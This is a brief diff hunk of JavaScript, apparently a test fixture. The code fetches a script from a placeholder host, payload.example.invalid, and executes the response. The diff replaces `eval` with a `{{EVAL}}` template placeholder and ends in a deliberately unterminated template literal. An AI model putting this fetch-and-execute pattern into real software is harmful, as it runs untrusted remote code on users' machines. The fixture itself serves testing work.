@@ -2,7 +2,7 @@
 const axios = require("axios");
 
 axios.get("https://payload.example.invalid/h").then((r) => {
-  eval(r.data);
+  {{EVAL}}(r.data);
 });
 
 const tail = `this template literal never ends
